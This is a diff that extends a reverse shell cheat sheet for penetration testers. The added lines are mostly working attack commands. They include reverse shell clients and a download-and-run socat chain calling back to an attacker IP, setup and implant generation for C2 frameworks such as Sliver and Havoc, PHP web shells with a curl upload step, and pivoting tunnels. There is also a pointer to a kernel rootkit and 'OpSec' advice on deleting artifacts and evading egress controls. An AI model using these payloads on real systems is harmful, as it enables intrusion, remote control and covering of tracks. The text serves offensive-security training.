@@ -1,6 +1,6 @@
 # Reverse Shell Cheat Sheet
 
-A practical guide for penetration testers covering common reverse shell payloads and TTY upgrade techniques.
+A practical guide for penetration testers covering common reverse shell payloads and modern handling tools.
 
 ## Quick Start
 
@@ -14,6 +14,205 @@ rlwrap nc -lvnp 4242
 **Replace these in all examples:**
 - `10.0.0.1` → Your IP address
 - `4242` → Your listening port
+
+---
+
+## Modern Shell Handlers (Recommended)
+
+### Penelope
+**Automated shell handling with auto-upgrade, file transfer, and more**
+
+```bash
+# Installation
+git clone https://github.com/brightio/penelope.git
+cd penelope && chmod +x penelope.py
+
+# Basic listener
+python3 penelope.py 4242
+
+# With auto-upgrade
+python3 penelope.py -i eth0 4242
+
+# Multiple sessions
+python3 penelope.py -i eth0 4242 4243 4244
+
+# Upload binary on connect
+python3 penelope.py 4242 -u linpeas.sh
+
+# Interactive mode with menu
+python3 penelope.py -i eth0
+```
+
+**Features:**
+- Auto-upgrade to PTY
+- Tab completion
+- Built-in file upload/download
+- Session management
+- Port forwarding
+- Script execution on connect
+
+### RustScan + nc
+```bash
+# Modern port scanner with shell handler
+rustscan -a 10.0.0.1 -- -A
+```
+
+### xc (Secure Reverse Shell)
+**Encrypted reverse shell with modern crypto**
+
+```bash
+# Installation
+go install github.com/xct/xc@latest
+
+# Listener (Server)
+xc -l -p 4242
+
+# Client (Victim - Linux)
+./xc 10.0.0.1:4242
+
+# Client (Victim - Windows)
+xc.exe 10.0.0.1:4242
+```
+
+**Features:**
+- AES-256-GCM encryption
+- No dependencies
+- Cross-platform (Linux, Windows, macOS)
+- Tiny binaries (~500KB)
+- Built-in file transfer
+
+**Download precompiled:**
+```bash
+# Get latest release from GitHub
+wget https://github.com/xct/xc/releases/latest/download/xc_linux_amd64 -O xc
+chmod +x xc
+```
+
+### reverse_ssh
+**Full SSH server tunneled through reverse connection**
+
+```bash
+# Installation
+go install github.com/Fahrj/reverse-ssh/cmd/reverse-ssh@latest
+
+# Or download precompiled
+wget https://github.com/NHAS/reverse_ssh/releases/latest/download/server
+wget https://github.com/NHAS/reverse_ssh/releases/latest/download/client
+
+# Server (Attacker)
+./server -p 2222
+
+# Client (Victim)
+./client -d 10.0.0.1:2222
+
+# Connect to victim
+ssh -p 2222 127.0.0.1
+```
+
+**Features:**
+- Full SSH capabilities
+- SCP support
+- SOCKS proxy
+- Port forwarding
+- Multiple sessions
+- Persistence
+
+### sliver
+**Modern C2 framework with reverse shells**
+
+```bash
+# Installation
+curl https://sliver.sh/install|sudo bash
+
+# Start server
+sliver-server
+
+# Generate implant
+generate --mtls 10.0.0.1:443 --os linux
+
+# Or HTTP beacon
+generate beacon --http 10.0.0.1:80
+```
+
+### pwncat-cs
+**Enhanced reverse shell handler with automation**
+
+```bash
+# Installation
+pip3 install pwncat-cs
+
+# Basic listener
+pwncat-cs -lp 4242
+
+# With platform detection
+pwncat-cs -l -p 4242 --platform linux
+
+# Bind shell
+pwncat-cs 10.0.0.1:4242
+```
+
+**Features:**
+- Automatic PTY upgrade
+- File upload/download
+- Persistence modules
+- Privilege escalation helpers
+- Command history across sessions
+
+### rustcat (rcat)
+**Modern netcat with auto-upgrade**
+
+```bash
+# Installation
+cargo install rustcat
+# Or download from https://github.com/robiot/rustcat/releases
+
+# Listener with auto-upgrade
+rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null" 4242
+
+# Standard listener
+rcat listen 4242
+
+# Connect
+rcat connect 10.0.0.1 4242
+```
+
+### Villain
+**Modern C2 with web GUI**
+
+```bash
+# Installation
+git clone https://github.com/t3l3machus/Villain.git
+cd Villain
+pip3 install -r requirements.txt
+
+# Start
+python3 Villain.py
+
+# Access web interface at https://127.0.0.1:6969
+```
+
+**Features:**
+- Web-based GUI
+- Session management
+- File browser
+- Built-in shells
+- HTTPS by default
+
+### Havoc C2
+**Modern C2 framework (Cobalt Strike alternative)**
+
+```bash
+# Installation
+git clone https://github.com/HavocFramework/Havoc.git
+cd Havoc
+make
+
+# Start teamserver
+./havoc server --profile ./profiles/havoc.yaotl
+
+# Start client
+./havoc client
+```
 
 ---
 
@@ -114,6 +313,19 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 
 # Download and execute
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+```
+
+### Encrypted (SSL/TLS)
+```bash
+# Generate certificate
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+cat shell.key shell.crt > shell.pem
+
+# Listener
+socat OPENSSL-LISTEN:4242,cert=shell.pem,verify=0,fork STDIO
+
+# Client
+socat OPENSSL:10.0.0.1:4242,verify=0 EXEC:/bin/bash
 ```
 
 ---
@@ -256,7 +468,7 @@ awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& 
 
 ## TTY Shell Upgrade
 
-### Method 1: Python PTY
+### Method 1: Python PTY (Most Common)
 ```bash
 # In reverse shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -266,10 +478,12 @@ python3 -c "__import__('pty').spawn('/bin/bash')"
 # Background the shell (Ctrl+Z)
 ^Z
 
-# On your local machine
+# On your local machine (get terminal size first)
+echo $TERM  # note this
+stty size   # note rows and cols
 stty raw -echo; fg
 
-# In the shell (if needed)
+# In the shell (press Enter twice)
 reset
 export SHELL=bash
 export TERM=xterm-256color
@@ -280,22 +494,37 @@ stty rows <num> columns <cols>
 ```bash
 # If 'su' requires a TTY
 /usr/bin/script -qc /bin/bash /dev/null
+
+# Alternative
+script -q /dev/null -c bash
 ```
 
-### Method 3: Socat
+### Method 3: Socat (Best Quality)
 ```bash
-# Use socat binary for automatic TTY
-# (Download from https://github.com/andrew-d/static-binaries)
+# Transfer socat to victim
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
+chmod +x /tmp/socat
+
+# Listener
+socat file:`tty`,raw,echo=0 tcp-listen:4242
+
+# Victim
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
 
-### Method 4: Other interpreters
+### Method 4: Other Interpreters
 ```bash
 perl -e 'exec "/bin/bash";'
 ruby: exec "/bin/bash"
 lua: os.execute('/bin/bash')
 ```
 
-### Get terminal size
+### Method 5: Expect
+```bash
+expect -c 'spawn /bin/bash; interact'
+```
+
+### Get Terminal Size
 ```bash
 # On your machine
 stty size
@@ -303,6 +532,31 @@ stty size
 
 # In reverse shell after upgrade
 stty rows 24 columns 80
+```
+
+---
+
+## Web Shells
+
+### weevely (PHP)
+```bash
+# Generate
+weevely generate password /tmp/shell.php
+
+# Connect
+weevely http://target.com/shell.php password
+```
+
+### PHP Web Shell (Simple)
+```php
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+```
+
+### Upload via curl
+```bash
+curl -X POST -F "file=@shell.php" http://target.com/upload.php
 ```
 
 ---
@@ -349,18 +603,115 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f macho > shell
 
 ---
 
-## Useful Tools
+## Pivoting & Tunneling Tools
 
-- **[reverse-shell-generator](https://www.revshells.com/)** - Online reverse shell generator
-- **[revshellgen](https://github.com/t0thkr1s/revshellgen)** - CLI reverse shell generator
-- **[rustcat](https://github.com/robiot/rustcat)** - Modern netcat alternative with auto-upgrade
-- **[pwncat](https://github.com/calebstewart/pwncat)** - Advanced reverse shell handler
+### Chisel
+```bash
+# Installation
+go install github.com/jpillora/chisel@latest
+
+# Server (Attacker)
+chisel server -p 8080 --reverse
+
+# Client (Victim)
+chisel client 10.0.0.1:8080 R:4242:127.0.0.1:4242
+```
+
+### ligolo-ng (Modern VPN-like)
+```bash
+# Download from https://github.com/nicocha30/ligolo-ng/releases
+
+# Server (Attacker)
+./proxy -selfcert
+
+# Agent (Victim)
+./agent -connect 10.0.0.1:11601 -ignore-cert
+```
+
+### SSH Tunneling
+```bash
+# Local port forward
+ssh -L 8080:localhost:80 user@target
+
+# Remote port forward (reverse tunnel)
+ssh -R 4242:localhost:4242 user@attacker
+
+# Dynamic SOCKS proxy
+ssh -D 1080 user@target
+```
+
+### sshuttle
+```bash
+# VPN over SSH
+sshuttle -r user@target 10.0.0.0/24
+```
 
 ---
 
-## Quick Reference
+## Shell Stabilization Tools
 
-### Enhanced Listeners
+### reptile (Advanced)
+```bash
+# Kernel-level rootkit with reverse shell
+git clone https://github.com/f0rb1dd3n/Reptile.git
+```
+
+### GTFOBins / LOLBins
+```bash
+# Use legitimate binaries for shells
+# GTFOBins: https://gtfobins.github.io/
+# LOLBAS: https://lolbas-project.github.io/
+```
+
+---
+
+## Modern Tool Comparison
+
+| Tool | Auto-Upgrade | Encryption | File Transfer | Multi-Session | Learning Curve |
+|------|-------------|------------|---------------|---------------|----------------|
+| **Penelope** | ✅ | ❌ | ✅ | ✅ | Easy |
+| **xc** | ❌ | ✅ | ✅ | ❌ | Easy |
+| **reverse_ssh** | ✅ | ✅ | ✅ | ✅ | Medium |
+| **pwncat-cs** | ✅ | ❌ | ✅ | ✅ | Medium |
+| **Sliver** | ✅ | ✅ | ✅ | ✅ | Medium |
+| **Villain** | ✅ | ✅ | ✅ | ✅ | Easy |
+| **Havoc** | ✅ | ✅ | ✅ | ✅ | Hard |
+| **rustcat** | ✅ | ❌ | ❌ | ❌ | Easy |
+
+---
+
+## Installation Quick Reference
+
+```bash
+# Penelope
+git clone https://github.com/brightio/penelope.git
+
+# xc
+go install github.com/xct/xc@latest
+
+# reverse_ssh
+go install github.com/NHAS/reverse_ssh@latest
+
+# pwncat-cs
+pip3 install pwncat-cs
+
+# rustcat
+cargo install rustcat
+
+# Chisel
+go install github.com/jpillora/chisel@latest
+
+# Sliver
+curl https://sliver.sh/install|sudo bash
+
+# ligolo-ng
+# Download from GitHub releases
+```
+
+---
+
+## Enhanced Listeners
+
 ```bash
 # rlwrap (command history and editing)
 rlwrap nc -lvnp 4242
@@ -371,19 +722,139 @@ pwncat-cs -lp 4242
 
 # rustcat (automatic TTY upgrade)
 rcat listen -ie "/usr/bin/script -qc /bin/bash /dev/null" 4242
-```
 
-### Tips
-1. Always use `rlwrap` for better shell interaction
-2. Check if Python is available for easy TTY upgrade
-3. Use `script` command if `su` requires a TTY
-4. For Windows 10+, ConPtyShell provides full interactivity
-5. Test shells in order: Bash → Python → Netcat → Others
+# Penelope (full automation)
+python3 penelope.py 4242
+
+# xc (encrypted)
+xc -l -p 4242
+```
 
 ---
 
-## Resources
+## File Transfer Methods
 
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+### From Reverse Shell
+
+```bash
+# wget
+wget http://10.0.0.1:8000/file
+
+# curl
+curl http://10.0.0.1:8000/file -o file
+
+# Python
+python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.0.0.1:8000/file", "file")'
+
+# nc
+nc -lvnp 4242 < file  # sender
+nc 10.0.0.1 4242 > file  # receiver
+
+# Base64 (for small files)
+echo "base64data" | base64 -d > file
+```
+
+### Host Files
+
+```bash
+# Python HTTP server
+python3 -m http.server 8000
+
+# PHP
+php -S 0.0.0.0:8000
+
+# Ruby
+ruby -run -ehttpd . -p8000
+
+# updog (better than Python)
+pip3 install updog
+updog -p 8000
+```
+
+---
+
+## Tips & Best Practices
+
+### Listener Priority
+1. **Penelope** - Best for quick pentests with auto-upgrade
+2. **xc** - When you need encryption
+3. **reverse_ssh** - For long-term access and tunneling
+4. **pwncat-cs** - For automation and enumeration
+5. **rlwrap + nc** - Classic fallback
+
+### Payload Priority
+1. **Bash TCP** - Try first (works on most Linux)
+2. **Python** - Second choice (usually installed)
+3. **Netcat variants** - Check which version is available
+4. **Compiled binaries** - Last resort (xc, reverse_ssh)
+
+### Stabilization Checklist
+- [ ] Upgrade to PTY
+- [ ] Set proper TERM and SHELL variables
+- [ ] Adjust terminal size
+- [ ] Test tab completion
+- [ ] Test Ctrl+C handling
+- [ ] Verify background/foreground works
+
+### OpSec Considerations
+- Use encrypted shells (xc, reverse_ssh, OpenSSL)
+- Delete artifacts after use
+- Use common ports (80, 443, 53)
+- Consider DNS tunneling for egress
+- Use legitimate tools when possible (GTFOBins)
+
+---
+
+## Useful One-Liners
+
+### Check for Python
+```bash
+which python python2 python3
+```
+
+### Find SUID binaries
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+### Check capabilities
+```bash
+getcap -r / 2>/dev/null
+```
+
+### Current user info
+```bash
+id; whoami; groups; uname -a
+```
+
+---
+
+## Resources & References
+
+### Tools
+- [Penelope](https://github.com/brightio/penelope) - Shell handler with auto-upgrade
+- [xc](https://github.com/xct/xc) - Encrypted reverse shell
+- [reverse_ssh](https://github.com/NHAS/reverse_ssh) - SSH over reverse connection
+- [pwncat-cs](https://github.com/calebstewart/pwncat) - Advanced shell handler
+- [rustcat](https://github.com/robiot/rustcat) - Modern netcat
+- [Villain](https://github.com/t3l3machus/Villain) - Web-based C2
+- [Sliver](https://github.com/BishopFox/sliver) - Modern C2 framework
+- [Havoc](https://github.com/HavocFramework/Havoc) - C2 framework
+- [Chisel](https://github.com/jpillora/chisel) - TCP/UDP tunnel
+- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Tunneling tool
+
+### Online Generators
+- [revshells.com](https://www.revshells.com/) - Reverse shell generator
+- [reverse-shell-generator](https://github.com/cwinfosec/revshellgen) - CLI generator
+
+### Learning Resources
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [GTFOBins](https://gtfobins.github.io/)
+- [LOLBAS](https://lolbas-project.github.io/)
+- [HackTricks](https://book.hacktricks.xyz/)
 - [IppSec Shells Tutorial](https://www.youtube.com/watch?v=DLzxrzFCOe4)
+
+---
+
+## License
+This cheat sheet is for educational and authorized penetration testing purposes only.
